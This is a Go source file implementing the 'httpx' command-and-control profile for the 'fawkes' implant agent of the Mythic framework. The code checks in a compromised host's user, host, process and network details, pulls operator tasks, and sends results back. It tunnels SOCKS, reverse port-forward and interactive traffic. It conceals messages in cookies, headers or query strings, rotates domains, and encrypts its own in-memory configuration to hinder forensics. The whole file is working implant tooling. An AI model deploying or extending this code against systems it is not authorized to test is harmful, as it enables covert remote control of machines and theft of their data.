package httpx

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	mrand "math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync/atomic"
	"time"

	"github.com/andybalholm/brotli"

	"fawkes/pkg/structs"
)

// AgentConfig is the parsed raw_c2_config JSON from the httpx C2 profile.
type AgentConfig struct {
	Name string     `json:"name"`
	Get  VerbConfig `json:"get"`
	Post VerbConfig `json:"post"`
}

// VerbConfig defines the HTTP method, URIs, and client/server transform configs.
type VerbConfig struct {
	Verb   string       `json:"verb"`
	URIs   []string     `json:"uris"`
	Client ClientConfig `json:"client"`
	Server ServerConfig `json:"server"`
}

// ClientConfig defines headers, parameters, message location, and transforms
// for the agent's outgoing requests.
type ClientConfig struct {
	Headers               map[string]string            `json:"headers"`
	Parameters            map[string]string            `json:"parameters"`
	DomainSpecificHeaders map[string]map[string]string `json:"domain_specific_headers"`
	Message               MessageConfig                `json:"message"`
	Transforms            []Transform                  `json:"transforms"`
}

// ServerConfig defines headers and transforms for the server's responses.
type ServerConfig struct {
	Headers    map[string]string `json:"headers"`
	Transforms []Transform       `json:"transforms"`
}

// MessageConfig specifies where the agent places its message in the HTTP request.
type MessageConfig struct {
	Location string `json:"location"` // "cookie", "query", "header", "body", or ""
	Name     string `json:"name"`     // name for cookie/query/header location
}

// sensitiveConfig holds fields that should not persist as plaintext in memory.
type sensitiveConfig struct {
	Domains       []string     `json:"d"`
	EncryptionKey string       `json:"k"`
	CallbackUUID  string       `json:"c"`
	Config        *AgentConfig `json:"cfg"`
}

// configVault holds AES-256-GCM encrypted C2 configuration.
type configVault struct {
	key  []byte
	blob []byte
}

// HTTPXProfile implements the Profile interface for the httpx C2 profile.
type HTTPXProfile struct {
	Domains           []string
	DomainRotation    string // "fail-over", "round-robin", "random"
	FailoverThreshold int
	EncryptionKey     string
	MaxRetries        int
	SleepInterval     int
	Jitter            int
	Debug             bool
	Config            *AgentConfig
	CallbackUUID      string
	ProxyURL          string
	client            *http.Client

	// Domain rotation state
	activeDomainIdx atomic.Int32
	failCount       atomic.Int32
	uriIdx          atomic.Uint32

	// Config vault
	vault *configVault

	// P2P delegate hooks
	GetDelegatesOnly     func() []structs.DelegateMessage
	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
	HandleDelegates      func(delegates []structs.DelegateMessage)

	// Rpfwd hooks
	GetRpfwdOutbound func() []structs.SocksMsg
	HandleRpfwd      func(msgs []structs.SocksMsg)

	// Interactive hooks
	GetInteractiveOutbound func() []structs.InteractiveMsg
	HandleInteractive      func(msgs []structs.InteractiveMsg)
}

// NewHTTPXProfile creates a new httpx C2 profile instance.
func NewHTTPXProfile(
	domains []string,
	rotation string,
	failoverThreshold int,
	encryptionKey string,
	maxRetries int,
	sleepInterval int,
	jitter int,
	debug bool,
	config *AgentConfig,
	proxyURL string,
) *HTTPXProfile {
	profile := &HTTPXProfile{
		Domains:           domains,
		DomainRotation:    rotation,
		FailoverThreshold: failoverThreshold,
		EncryptionKey:     encryptionKey,
		MaxRetries:        maxRetries,
		SleepInterval:     sleepInterval,
		Jitter:            jitter,
		Debug:             debug,
		Config:            config,
		ProxyURL:          proxyURL,
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // Skip TLS verification for self-signed C2 certs
		},
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout:     90 * time.Second,
	}

	if proxyURL != "" {
		if proxyU, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxyU)
		}
	}

	profile.client = &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
	}

	return profile
}

// SealConfig encrypts sensitive fields into the config vault.
func (h *HTTPXProfile) SealConfig() error {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("config vault key generation failed: %w", err)
	}

	cfg := &sensitiveConfig{
		Domains:       h.Domains,
		EncryptionKey: h.EncryptionKey,
		CallbackUUID:  h.CallbackUUID,
		Config:        h.Config,
	}

	plaintext, err := json.Marshal(cfg)
	if err != nil {
		zeroBytes(key)
		return fmt.Errorf("config vault marshal failed: %w", err)
	}

	blob := vaultEncrypt(key, plaintext)
	zeroBytes(plaintext)
	if blob == nil {
		zeroBytes(key)
		return fmt.Errorf("config vault encryption failed")
	}

	h.vault = &configVault{key: key, blob: blob}

	// Zero plaintext struct fields
	h.Domains = nil
	h.EncryptionKey = ""
	h.CallbackUUID = ""
	h.Config = nil

	return nil
}

// getConfig returns the current C2 configuration, decrypting from vault if active.
func (h *HTTPXProfile) getConfig() *sensitiveConfig {
	if h.vault == nil {
		return &sensitiveConfig{
			Domains:       h.Domains,
			EncryptionKey: h.EncryptionKey,
			CallbackUUID:  h.CallbackUUID,
			Config:        h.Config,
		}
	}

	plaintext := vaultDecrypt(h.vault.key, h.vault.blob)
	if plaintext == nil {
		return nil
	}

	var cfg sensitiveConfig
	if err := json.Unmarshal(plaintext, &cfg); err != nil {
		zeroBytes(plaintext)
		return nil
	}
	zeroBytes(plaintext)
	return &cfg
}

// UpdateCallbackUUID updates the callback UUID in the vault or struct.
func (h *HTTPXProfile) UpdateCallbackUUID(uuid string) {
	if h.vault != nil {
		cfg := h.getConfig()
		if cfg != nil {
			cfg.CallbackUUID = uuid
			plaintext, err := json.Marshal(cfg)
			if err == nil {
				newBlob := vaultEncrypt(h.vault.key, plaintext)
				zeroBytes(plaintext)
				if newBlob != nil {
					zeroBytes(h.vault.blob)
					h.vault.blob = newBlob
				}
			}
		}
		return
	}
	h.CallbackUUID = uuid
}

// GetCallbackUUID returns the callback UUID.
func (h *HTTPXProfile) GetCallbackUUID() string {
	if h.vault != nil {
		cfg := h.getConfig()
		if cfg != nil {
			return cfg.CallbackUUID
		}
	}
	if h.CallbackUUID != "" {
		return h.CallbackUUID
	}
	return ""
}

// getActiveUUID returns the callback UUID if available, otherwise the payload UUID.
func (h *HTTPXProfile) getActiveUUID(agent *structs.Agent, cfg *sensitiveConfig) string {
	if cfg.CallbackUUID != "" {
		return cfg.CallbackUUID
	}
	return agent.PayloadUUID
}

// Checkin performs the initial agent registration with Mythic via httpx.
func (h *HTTPXProfile) Checkin(agent *structs.Agent) error {
	cfg := h.getConfig()
	if cfg == nil {
		return fmt.Errorf("failed to decrypt C2 configuration")
	}

	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		IPs:          []string{agent.InternalIP},
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin message: %w", err)
	}

	// Encrypt
	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return fmt.Errorf("encryption failed: %w", err)
		}
	}

	// Mythic format: UUID + encrypted body → base64
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Apply client transforms and send via POST config
	resp, err := h.sendMessage([]byte(encodedData), &cfg.Config.Post, cfg)
	if err != nil {
		return fmt.Errorf("checkin request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
	}

	// Read and reverse server transforms on response
	respBody, err := h.receiveMessage(resp, &cfg.Config.Post)
	if err != nil {
		return fmt.Errorf("failed to read checkin response: %w", err)
	}

	// Decrypt response
	var decryptedResponse []byte
	if cfg.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return fmt.Errorf("failed to decode checkin response: %w", err)
		}
		decryptedResponse, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return fmt.Errorf("failed to decrypt checkin response: %w", err)
		}
	} else {
		decryptedResponse = respBody
	}

	// Parse response to extract callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			h.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			h.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else {
		log.Printf("no session id, using default")
		h.UpdateCallbackUUID(agent.PayloadUUID)
	}

	return nil
}

// GetTasking retrieves tasks from Mythic via httpx.
func (h *HTTPXProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	cfg := h.getConfig()
	if cfg == nil {
		return nil, nil, fmt.Errorf("failed to decrypt C2 configuration")
	}

	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: -1,
		Socks:       outboundSocks,
		PayloadUUID: h.getActiveUUID(agent, cfg),
		PayloadType: "fawkes",
		C2Profile:   "httpx",
	}

	// Collect delegate messages
	if h.GetDelegatesOnly != nil {
		if delegates := h.GetDelegatesOnly(); len(delegates) > 0 {
			taskingMsg.Delegates = delegates
		}
	}
	if h.GetRpfwdOutbound != nil {
		if rpfwdMsgs := h.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
			taskingMsg.Rpfwd = rpfwdMsgs
		}
	}
	if h.GetInteractiveOutbound != nil {
		if interactiveMsgs := h.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
			taskingMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
	}

	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return nil, nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	activeUUID := h.getActiveUUID(agent, cfg)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Use GET config for get_tasking
	resp, err := h.sendMessage([]byte(encodedData), &cfg.Config.Get, cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("get tasking request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
	}

	respBody, err := h.receiveMessage(resp, &cfg.Config.Get)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
	}

	var decryptedData []byte
	if cfg.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
		}
		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
	} else {
		decryptedData = respBody
	}

	var taskResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
		return []structs.Task{}, nil, nil
	}

	// Extract tasks
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.NewTask(
						getString(taskMap, "id"),
						getString(taskMap, "command"),
						getString(taskMap, "parameters"),
					)
					tasks = append(tasks, task)
				}
			}
		}
	}

	// Extract SOCKS
	var inboundSocks []structs.SocksMsg
	if socksList, exists := taskResponse["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
				log.Printf("proxy parse error: %v", err)
			}
		}
	}

	// Route rpfwd
	if h.HandleRpfwd != nil {
		if rpfwdList, exists := taskResponse["rpfwd"]; exists {
			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
				var rpfwdMsgs []structs.SocksMsg
				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
					h.HandleRpfwd(rpfwdMsgs)
				}
			}
		}
	}

	// Route interactive
	if h.HandleInteractive != nil {
		if interactiveList, exists := taskResponse["interactive"]; exists {
			if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
				var interactiveMsgs []structs.InteractiveMsg
				if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
					h.HandleInteractive(interactiveMsgs)
				}
			}
		}
	}

	// Route delegates
	if h.HandleDelegates != nil {
		if delegateList, exists := taskResponse["delegates"]; exists {
			if delegateRaw, err := json.Marshal(delegateList); err == nil {
				var delegateMsgs []structs.DelegateMessage
				if err := json.Unmarshal(delegateRaw, &delegateMsgs); err == nil && len(delegateMsgs) > 0 {
					h.HandleDelegates(delegateMsgs)
				}
			}
		}
	}

	return tasks, inboundSocks, nil
}

// PostResponse sends task output back to Mythic via httpx.
func (h *HTTPXProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	cfg := h.getConfig()
	if cfg == nil {
		return nil, fmt.Errorf("failed to decrypt C2 configuration")
	}

	postMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
		Socks:     socks,
	}

	// Collect delegates AND edges for PostResponse
	if h.GetDelegatesAndEdges != nil {
		delegates, edges := h.GetDelegatesAndEdges()
		if len(delegates) > 0 {
			postMsg.Delegates = delegates
		}
		if len(edges) > 0 {
			postMsg.Edges = edges
		}
	}
	if h.GetRpfwdOutbound != nil {
		if rpfwdMsgs := h.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
			postMsg.Rpfwd = rpfwdMsgs
		}
	}
	if h.GetInteractiveOutbound != nil {
		if interactiveMsgs := h.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
			postMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(postMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal post response: %w", err)
	}

	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	activeUUID := h.getActiveUUID(agent, cfg)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Use POST config for post_response
	resp, err := h.sendMessage([]byte(encodedData), &cfg.Config.Post, cfg)
	if err != nil {
		return nil, fmt.Errorf("post response request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
	}

	respBody, err := h.receiveMessage(resp, &cfg.Config.Post)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}

	var decryptedData []byte
	if cfg.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, fmt.Errorf("failed to decode response: %w", err)
		}
		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
	} else {
		decryptedData = respBody
	}

	// Route inbound messages from the post_response response
	var postResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &postResponse); err == nil {
		if h.HandleRpfwd != nil {
			if rpfwdList, exists := postResponse["rpfwd"]; exists {
				if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
					var rpfwdMsgs []structs.SocksMsg
					if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
						h.HandleRpfwd(rpfwdMsgs)
					}
				}
			}
		}
		if h.HandleDelegates != nil {
			if delegateList, exists := postResponse["delegates"]; exists {
				if delegateRaw, err := json.Marshal(delegateList); err == nil {
					var delegateMsgs []structs.DelegateMessage
					if err := json.Unmarshal(delegateRaw, &delegateMsgs); err == nil && len(delegateMsgs) > 0 {
						h.HandleDelegates(delegateMsgs)
					}
				}
			}
		}
		if h.HandleInteractive != nil {
			if interactiveList, exists := postResponse["interactive"]; exists {
				if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
					var interactiveMsgs []structs.InteractiveMsg
					if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
						h.HandleInteractive(interactiveMsgs)
					}
				}
			}
		}
	}

	return decryptedData, nil
}

// sendMessage applies client transforms, handles message placement, and sends
// the HTTP request using the appropriate verb, URI, and domain.
func (h *HTTPXProfile) sendMessage(data []byte, verbCfg *VerbConfig, cfg *sensitiveConfig) (*http.Response, error) {
	// Apply client transforms forward
	transformed, err := ApplyTransformsForward(data, verbCfg.Client.Transforms)
	if err != nil {
		return nil, fmt.Errorf("client transforms failed: %w", err)
	}

	// Select domain
	domain := h.selectDomain(cfg)

	// Select URI (round-robin)
	uri := h.selectURI(verbCfg)

	// Build the request URL
	reqURL := strings.TrimRight(domain, "/") + uri

	// Build request based on message location
	var req *http.Request
	loc := verbCfg.Client.Message.Location
	verb := strings.ToUpper(verbCfg.Verb)
	if verb == "" {
		verb = "GET"
	}

	switch loc {
	case "body", "":
		req, err = http.NewRequest(verb, reqURL, bytes.NewReader(transformed))
	case "cookie":
		req, err = http.NewRequest(verb, reqURL, nil)
		if err == nil {
			req.AddCookie(&http.Cookie{
				Name:  verbCfg.Client.Message.Name,
				Value: string(transformed),
			})
		}
	case "query":
		parsedURL, parseErr := url.Parse(reqURL)
		if parseErr != nil {
			return nil, fmt.Errorf("failed to parse URL: %w", parseErr)
		}
		q := parsedURL.Query()
		q.Set(verbCfg.Client.Message.Name, string(transformed))
		parsedURL.RawQuery = q.Encode()
		req, err = http.NewRequest(verb, parsedURL.String(), nil)
	case "header":
		req, err = http.NewRequest(verb, reqURL, nil)
		if err == nil {
			req.Header.Set(verbCfg.Client.Message.Name, string(transformed))
		}
	default:
		req, err = http.NewRequest(verb, reqURL, bytes.NewReader(transformed))
	}

	if err != nil {
		h.recordFailure()
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	// Set client headers from config
	for k, v := range verbCfg.Client.Headers {
		req.Header.Set(k, v)
	}

	// Set query parameters from config
	if len(verbCfg.Client.Parameters) > 0 {
		q := req.URL.Query()
		for k, v := range verbCfg.Client.Parameters {
			q.Set(k, v)
		}
		req.URL.RawQuery = q.Encode()
	}

	// Set domain-specific headers
	if cfg.Config != nil {
		domainHost := extractHost(domain)
		if dsh, ok := verbCfg.Client.DomainSpecificHeaders[domainHost]; ok {
			for k, v := range dsh {
				req.Header.Set(k, v)
			}
		}
	}

	resp, err := h.client.Do(req)
	if err != nil {
		if resp != nil && resp.Body != nil {
			resp.Body.Close()
		}
		h.recordFailure()
		return nil, fmt.Errorf("HTTP request failed: %w", err)
	}

	// Success — reset failure count
	h.failCount.Store(0)
	return resp, nil
}

// receiveMessage reads the response body and reverses server transforms.
func (h *HTTPXProfile) receiveMessage(resp *http.Response, verbCfg *VerbConfig) ([]byte, error) {
	body, err := readResponseBody(resp)
	if err != nil {
		return nil, err
	}

	// Reverse server transforms
	return ApplyTransformsReverse(body, verbCfg.Server.Transforms)
}

// selectDomain picks the next domain based on the rotation strategy.
func (h *HTTPXProfile) selectDomain(cfg *sensitiveConfig) string {
	domains := cfg.Domains
	if len(domains) == 0 {
		return ""
	}
	if len(domains) == 1 {
		return domains[0]
	}

	switch h.DomainRotation {
	case "round-robin":
		idx := h.activeDomainIdx.Add(1) - 1
		return domains[int(idx)%len(domains)]
	case "random":
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(domains))))
		if err != nil {
			return domains[mrand.Intn(len(domains))]
		}
		return domains[n.Int64()]
	default: // "fail-over"
		idx := int(h.activeDomainIdx.Load())
		if idx >= len(domains) {
			idx = 0
		}
		return domains[idx]
	}
}

// recordFailure increments the failure counter and triggers failover if threshold exceeded.
func (h *HTTPXProfile) recordFailure() {
	if h.DomainRotation != "fail-over" {
		return
	}
	count := h.failCount.Add(1)
	if int(count) >= h.FailoverThreshold {
		h.failCount.Store(0)
		h.activeDomainIdx.Add(1)
		log.Printf("failover: switched domain")
	}
}

// selectURI picks the next URI from the verb config, rotating round-robin.
func (h *HTTPXProfile) selectURI(verbCfg *VerbConfig) string {
	uris := verbCfg.URIs
	if len(uris) == 0 {
		return "/"
	}

	// Use verb-appropriate counter based on whether this is get or post config.
	// Since we don't know which verb config this is, use a shared counter per direction.
	// The caller context (Get vs Post) determines which counter is used.
	idx := h.uriIdx.Add(1) - 1
	return uris[int(idx)%len(uris)]
}

// extractHost extracts the hostname from a full URL for domain-specific header matching.
func extractHost(rawURL string) string {
	if u, err := url.Parse(rawURL); err == nil {
		return u.Hostname()
	}
	return rawURL
}

// getString safely gets a string value from a map.
func getString(m map[string]interface{}, key string) string {
	if val, exists := m[key]; exists {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

// readResponseBody reads and decompresses the response body if needed.
func readResponseBody(resp *http.Response) ([]byte, error) {
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		gr, err := gzip.NewReader(resp.Body)
		if err != nil {
			return nil, fmt.Errorf("gzip decompression failed: %w", err)
		}
		defer gr.Close()
		return io.ReadAll(gr)
	case "br":
		return io.ReadAll(brotli.NewReader(resp.Body))
	default:
		return io.ReadAll(resp.Body)
	}
}

// Encryption/decryption methods — same Freyja format as HTTP profile.

func (h *HTTPXProfile) encryptMessage(msg []byte, encKey string) ([]byte, error) {
	if encKey == "" {
		return msg, nil
	}

	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, fmt.Errorf("failed to generate IV: %w", err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	padded := pkcs7Pad(msg, aes.BlockSize)
	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)

	ivCiphertext := append(iv, encrypted...)
	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)

	return append(ivCiphertext, hmacHash.Sum(nil)...), nil
}

func (h *HTTPXProfile) decryptResponse(data []byte, encKey string) ([]byte, error) {
	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	// Response format: UUID (36 bytes) + IV (16) + Ciphertext + HMAC (32)
	if len(data) < 36 {
		return nil, fmt.Errorf("response too short for UUID prefix")
	}
	data = data[36:] // Strip UUID prefix

	if len(data) < aes.BlockSize+sha256.Size {
		return nil, fmt.Errorf("response too short for decryption")
	}

	// Verify HMAC
	hmacStart := len(data) - sha256.Size
	ivCiphertext := data[:hmacStart]
	expectedHMAC := data[hmacStart:]

	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)
	if !hmac.Equal(hmacHash.Sum(nil), expectedHMAC) {
		return nil, fmt.Errorf("HMAC verification failed")
	}

	// Decrypt
	iv := ivCiphertext[:aes.BlockSize]
	ciphertext := ivCiphertext[aes.BlockSize:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	return pkcs7Unpad(plaintext)
}

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

func pkcs7Unpad(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	padding := int(data[len(data)-1])
	if padding > len(data) || padding == 0 {
		return nil, fmt.Errorf("invalid padding")
	}
	for i := len(data) - padding; i < len(data); i++ {
		if data[i] != byte(padding) {
			return nil, fmt.Errorf("invalid padding byte")
		}
	}
	return data[:len(data)-padding], nil
}

// Config vault helpers — same AES-256-GCM pattern as HTTP profile.

func vaultEncrypt(key, plaintext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil
	}
	return gcm.Seal(nonce, nonce, plaintext, nil)
}

func vaultDecrypt(key, blob []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	if len(blob) < gcm.NonceSize() {
		return nil
	}
	nonce := blob[:gcm.NonceSize()]
	ciphertext := blob[gcm.NonceSize():]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil
	}
	return plaintext
}

func zeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

// ParseAgentConfig parses the raw_c2_config JSON into an AgentConfig struct.
func ParseAgentConfig(data []byte) (*AgentConfig, error) {
	var cfg AgentConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("failed to parse agent config: %w", err)
	}
	return &cfg, nil
}
